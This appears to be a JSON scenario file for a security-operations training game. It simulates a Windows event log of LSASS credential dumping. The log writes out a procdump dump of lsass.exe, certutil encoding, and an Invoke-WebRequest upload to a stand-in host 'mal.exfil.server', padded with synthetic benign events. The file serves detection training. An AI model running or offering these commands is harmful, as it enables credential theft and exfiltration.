@@ -1,0 +1,726 @@
+[
+  {
+    "Name": "3-3透過 LSASS 進行憑證轉儲和洩露",
+    "EventID": "Multi",
+    "EventName": "疑似透過 LSASS 執行記憶體傾印並外傳憑證資料",
+    "Description": "偵測到 it-admin 從外部來源登入 WS-10 並取得高權限，隨後使用 tasklist、procdump 等工具對 LSASS 進行記憶體傾印。",
+    "SourceIP": {
+      "IP": "192.168.0.1",
+      "Source": {
+        "IsFromCompany?": true
+      },
+      "BeenBlocking?": false,
+      "isDanger?": true,
+      "Port": "N/A",
+      "Index": 0,
+      "Direction": "Inbound",
+      "Department": "Production"
+    },
+    "EventType": "Hacked",
+    "Stage": 3,
+    "SolveType": "ChangeCharacter",
+    "SourceIPs": [
+      {
+        "IP": "192.168.0.1",
+        "Source": {
+          "IsFromCompany?": true
+        },
+        "BeenBlocking?": false,
+        "isDanger?": true,
+        "Port": "N/A",
+        "Index": 0,
+        "Direction": "Inbound",
+        "Department": "Production"
+      }
+    ],
+    "AttackTimes": 1,
+    "CostMoney": 0,
+    "CostPlayerCreditInCompany": 0,
+    "GainCredit": 0,
+    "Commentary": "",
+    "BadResultText": "",
+    "GoodResultText": "",
+    "AttackStep": 1,
+    "S_EventJsonCode": [
+  {
+    "TimeStamp": "2025-01-04T10:30:00",
+    "EventID": "4624",
+    "LogonType": 10,
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "SourceIP": "192.168.10.33",
+    "Process_Image": "mstsc.exe",
+    "Description": "RDP login to WS-10"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:30:03",
+    "EventID": "4672",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "SourceIP": "192.168.10.33",
+    "Description": "Special privileges assigned (seDebug, seTcb) after elevation"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:30:06",
+    "EventID": "4688",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "tasklist.exe",
+    "CommandLine": "tasklist /svc | findstr lsass",
+    "Description": "Recon: check lsass"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:30:09",
+    "EventID": "4688",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "procdump64.exe",
+    "CommandLine": "procdump64 -ma lsass.exe lsass.dmp",
+    "Description": "Dump LSASS (procdump)"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:30:12",
+    "EventID": "4688",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "powershell.exe",
+    "CommandLine": "Compress-Archive -Path lsass.dmp -DestinationPath lsass.zip",
+    "Description": "Compress dumped credentials"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:30:15",
+    "EventID": "4688",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "certutil.exe",
+    "CommandLine": "certutil -encode lsass.zip lsass.b64",
+    "Description": "Encode payload"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:30:18",
+    "EventID": "4688",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "powershell.exe",
+    "CommandLine": "Invoke-WebRequest -Uri 'http://mal.exfil.server/upload' -Method POST -InFile lsass.b64",
+    "Description": "Exfiltrate encoded dump"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:30:21",
+    "EventID": "4673",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "cmd.exe",
+    "CommandLine": "",
+    "Description": "Post-dump reconnaissance"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:30:24",
+    "EventID": "4688",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "whoami.exe",
+    "CommandLine": "whoami /all",
+    "Description": "Post-dump reconnaissance"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:30:27",
+    "EventID": "4624",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "net.exe",
+    "CommandLine": "whoami /all",
+    "Description": "Post-dump reconnaissance"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:30:30",
+    "EventID": "4624",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "whoami.exe",
+    "CommandLine": "whoami /all",
+    "Description": "Post-dump reconnaissance"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:30:33",
+    "EventID": "4688",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "net.exe",
+    "CommandLine": "whoami /all",
+    "Description": "Post-dump reconnaissance"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:30:36",
+    "EventID": "4624",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "net.exe",
+    "CommandLine": "",
+    "Description": "Post-dump reconnaissance"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:30:39",
+    "EventID": "4673",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "cmd.exe",
+    "CommandLine": "",
+    "Description": "Post-dump reconnaissance"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:30:42",
+    "EventID": "4624",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "whoami.exe",
+    "CommandLine": "whoami /all",
+    "Description": "Post-dump reconnaissance"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:30:45",
+    "EventID": "4688",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "whoami.exe",
+    "CommandLine": "",
+    "Description": "Post-dump reconnaissance"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:30:48",
+    "EventID": "4673",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "whoami.exe",
+    "CommandLine": "",
+    "Description": "Post-dump reconnaissance"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:30:51",
+    "EventID": "4688",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "whoami.exe",
+    "CommandLine": "",
+    "Description": "Post-dump reconnaissance"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:30:54",
+    "EventID": "4673",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "cmd.exe",
+    "CommandLine": "whoami /all",
+    "Description": "Post-dump reconnaissance"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:30:57",
+    "EventID": "4673",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "whoami.exe",
+    "CommandLine": "",
+    "Description": "Post-dump reconnaissance"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:31:00",
+    "EventID": "4688",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "cmd.exe",
+    "CommandLine": "whoami /all",
+    "Description": "Post-dump reconnaissance"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:31:03",
+    "EventID": "4688",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "net.exe",
+    "CommandLine": "whoami /all",
+    "Description": "Post-dump reconnaissance"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:31:06",
+    "EventID": "4673",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "whoami.exe",
+    "CommandLine": "",
+    "Description": "Post-dump reconnaissance"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:31:09",
+    "EventID": "4688",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "cmd.exe",
+    "CommandLine": "whoami /all",
+    "Description": "Post-dump reconnaissance"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:31:12",
+    "EventID": "4673",
+    "User": "it-admin",
+    "HostName": "WS-10",
+    "Process_Image": "cmd.exe",
+    "CommandLine": "",
+    "Description": "Post-dump reconnaissance"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:31:15",
+    "EventID": "5156",
+    "User": "user3",
+    "HostName": "WS-11",
+    "SourceIP": "192.168.11.22",
+    "Process_Image": "OUTLOOK.EXE",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:31:18",
+    "EventID": "5156",
+    "User": "user3",
+    "HostName": "WS-11",
+    "SourceIP": "192.168.11.21",
+    "Process_Image": "EXCEL.EXE",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:31:21",
+    "EventID": "5156",
+    "User": "finance_user",
+    "HostName": "WS-10",
+    "SourceIP": "192.168.11.31",
+    "Process_Image": "explorer.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:31:24",
+    "EventID": "4624",
+    "User": "finance_user",
+    "HostName": "WS-14",
+    "SourceIP": "192.168.11.15",
+    "Process_Image": "SearchApp.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:31:27",
+    "EventID": "5156",
+    "User": "finance_user",
+    "HostName": "WS-12",
+    "SourceIP": "192.168.11.6",
+    "Process_Image": "OUTLOOK.EXE",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:31:30",
+    "EventID": "5156",
+    "User": "user3",
+    "HostName": "WS-11",
+    "SourceIP": "192.168.11.30",
+    "Process_Image": "SearchApp.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:31:33",
+    "EventID": "5156",
+    "User": "user4",
+    "HostName": "WS-14",
+    "SourceIP": "192.168.11.2",
+    "Process_Image": "SearchApp.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:31:36",
+    "EventID": "5156",
+    "User": "user4",
+    "HostName": "WS-10",
+    "SourceIP": "192.168.11.10",
+    "Process_Image": "Teams.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:31:39",
+    "EventID": "4624",
+    "User": "finance_user",
+    "HostName": "WS-14",
+    "SourceIP": "192.168.11.11",
+    "Process_Image": "Teams.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:31:42",
+    "EventID": "5156",
+    "User": "user4",
+    "HostName": "WS-11",
+    "SourceIP": "192.168.11.23",
+    "Process_Image": "OUTLOOK.EXE",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:31:45",
+    "EventID": "5156",
+    "User": "user4",
+    "HostName": "WS-13",
+    "SourceIP": "192.168.11.18",
+    "Process_Image": "svchost.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:31:48",
+    "EventID": "4624",
+    "User": "user4",
+    "HostName": "WS-13",
+    "SourceIP": "192.168.11.19",
+    "Process_Image": "svchost.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:31:51",
+    "EventID": "4624",
+    "User": "user3",
+    "HostName": "WS-11",
+    "SourceIP": "192.168.11.18",
+    "Process_Image": "OneDrive.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:31:54",
+    "EventID": "5158",
+    "User": "user4",
+    "HostName": "WS-13",
+    "SourceIP": "192.168.11.37",
+    "Process_Image": "svchost.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:31:57",
+    "EventID": "4624",
+    "User": "finance_user",
+    "HostName": "WS-11",
+    "SourceIP": "192.168.11.36",
+    "Process_Image": "svchost.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:32:00",
+    "EventID": "5156",
+    "User": "user4",
+    "HostName": "WS-14",
+    "SourceIP": "192.168.11.11",
+    "Process_Image": "dllhost.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:32:03",
+    "EventID": "4688",
+    "User": "finance_user",
+    "HostName": "WS-12",
+    "SourceIP": "192.168.11.25",
+    "Process_Image": "svchost.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:32:06",
+    "EventID": "5156",
+    "User": "finance_user",
+    "HostName": "WS-11",
+    "SourceIP": "192.168.11.8",
+    "Process_Image": "RuntimeBroker.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:32:09",
+    "EventID": "5158",
+    "User": "user4",
+    "HostName": "WS-11",
+    "SourceIP": "192.168.11.17",
+    "Process_Image": "OneDrive.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:32:12",
+    "EventID": "4688",
+    "User": "user3",
+    "HostName": "WS-10",
+    "SourceIP": "192.168.11.13",
+    "Process_Image": "RuntimeBroker.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:32:15",
+    "EventID": "5158",
+    "User": "user4",
+    "HostName": "WS-11",
+    "SourceIP": "192.168.11.19",
+    "Process_Image": "OneDrive.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:32:18",
+    "EventID": "4624",
+    "User": "user3",
+    "HostName": "WS-10",
+    "SourceIP": "192.168.11.32",
+    "Process_Image": "OUTLOOK.EXE",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:32:21",
+    "EventID": "4688",
+    "User": "user3",
+    "HostName": "WS-12",
+    "SourceIP": "192.168.11.21",
+    "Process_Image": "OUTLOOK.EXE",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:32:24",
+    "EventID": "4688",
+    "User": "finance_user",
+    "HostName": "WS-11",
+    "SourceIP": "192.168.11.27",
+    "Process_Image": "RuntimeBroker.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:32:27",
+    "EventID": "5156",
+    "User": "finance_user",
+    "HostName": "WS-12",
+    "SourceIP": "192.168.11.24",
+    "Process_Image": "SearchApp.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:32:30",
+    "EventID": "5158",
+    "User": "user4",
+    "HostName": "WS-14",
+    "SourceIP": "192.168.11.23",
+    "Process_Image": "svchost.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:32:33",
+    "EventID": "4624",
+    "User": "user3",
+    "HostName": "WS-11",
+    "SourceIP": "192.168.11.39",
+    "Process_Image": "Teams.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:32:36",
+    "EventID": "4624",
+    "User": "finance_user",
+    "HostName": "WS-14",
+    "SourceIP": "192.168.11.29",
+    "Process_Image": "RuntimeBroker.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:32:39",
+    "EventID": "5156",
+    "User": "user3",
+    "HostName": "WS-14",
+    "SourceIP": "192.168.11.34",
+    "Process_Image": "chrome.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:32:42",
+    "EventID": "5158",
+    "User": "user4",
+    "HostName": "WS-11",
+    "SourceIP": "192.168.11.18",
+    "Process_Image": "svchost.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:32:45",
+    "EventID": "5158",
+    "User": "finance_user",
+    "HostName": "WS-14",
+    "SourceIP": "192.168.11.36",
+    "Process_Image": "OUTLOOK.EXE",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:32:48",
+    "EventID": "5156",
+    "User": "user3",
+    "HostName": "WS-10",
+    "SourceIP": "192.168.11.23",
+    "Process_Image": "explorer.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:32:51",
+    "EventID": "5156",
+    "User": "user4",
+    "HostName": "WS-10",
+    "SourceIP": "192.168.11.21",
+    "Process_Image": "SearchApp.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:32:54",
+    "EventID": "5156",
+    "User": "user4",
+    "HostName": "WS-13",
+    "SourceIP": "192.168.11.22",
+    "Process_Image": "dllhost.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:32:57",
+    "EventID": "5156",
+    "User": "user4",
+    "HostName": "WS-11",
+    "SourceIP": "192.168.11.14",
+    "Process_Image": "dllhost.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:33:00",
+    "EventID": "5158",
+    "User": "user4",
+    "HostName": "WS-11",
+    "SourceIP": "192.168.11.38",
+    "Process_Image": "Teams.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:33:03",
+    "EventID": "5158",
+    "User": "user4",
+    "HostName": "WS-10",
+    "SourceIP": "192.168.11.21",
+    "Process_Image": "Teams.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:33:06",
+    "EventID": "4688",
+    "User": "user3",
+    "HostName": "WS-14",
+    "SourceIP": "192.168.11.40",
+    "Process_Image": "RuntimeBroker.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:33:09",
+    "EventID": "5158",
+    "User": "user3",
+    "HostName": "WS-13",
+    "SourceIP": "192.168.11.15",
+    "Process_Image": "SearchApp.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:33:12",
+    "EventID": "5158",
+    "User": "user4",
+    "HostName": "WS-11",
+    "SourceIP": "192.168.11.7",
+    "Process_Image": "Teams.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:33:15",
+    "EventID": "5156",
+    "User": "finance_user",
+    "HostName": "WS-11",
+    "SourceIP": "192.168.11.21",
+    "Process_Image": "OUTLOOK.EXE",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:33:18",
+    "EventID": "4688",
+    "User": "finance_user",
+    "HostName": "WS-10",
+    "SourceIP": "192.168.11.4",
+    "Process_Image": "OUTLOOK.EXE",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:33:21",
+    "EventID": "5158",
+    "User": "user4",
+    "HostName": "WS-10",
+    "SourceIP": "192.168.11.31",
+    "Process_Image": "dllhost.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:33:24",
+    "EventID": "4688",
+    "User": "user4",
+    "HostName": "WS-13",
+    "SourceIP": "192.168.11.33",
+    "Process_Image": "dllhost.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:33:27",
+    "EventID": "4688",
+    "User": "finance_user",
+    "HostName": "WS-10",
+    "SourceIP": "192.168.11.8",
+    "Process_Image": "dllhost.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:33:30",
+    "EventID": "4688",
+    "User": "finance_user",
+    "HostName": "WS-14",
+    "SourceIP": "192.168.11.31",
+    "Process_Image": "svchost.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:33:33",
+    "EventID": "4688",
+    "User": "finance_user",
+    "HostName": "WS-13",
+    "SourceIP": "192.168.11.10",
+    "Process_Image": "EXCEL.EXE",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:33:36",
+    "EventID": "5156",
+    "User": "user3",
+    "HostName": "WS-14",
+    "SourceIP": "192.168.11.34",
+    "Process_Image": "dllhost.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:33:39",
+    "EventID": "5158",
+    "User": "finance_user",
+    "HostName": "WS-13",
+    "SourceIP": "192.168.11.30",
+    "Process_Image": "Teams.exe",
+    "Description": "Background app usage / sync"
+  },
+  {
+    "TimeStamp": "2025-01-04T10:33:42",
+    "EventID": "4688",
+    "User": "user4",
+    "HostName": "WS-12",
+    "SourceIP": "192.168.11.35",
+    "Process_Image": "EXCEL.EXE",
+    "Description": "Background app usage / sync"
+  }
+    ],
+    "AttackStaff": {
+      "DataTable": "/Script/Engine.DataTable'/Game/Company/Staff/DT_Staff.DT_Staff'",
+      "RowName": "andy"
+    }
+  }
+]
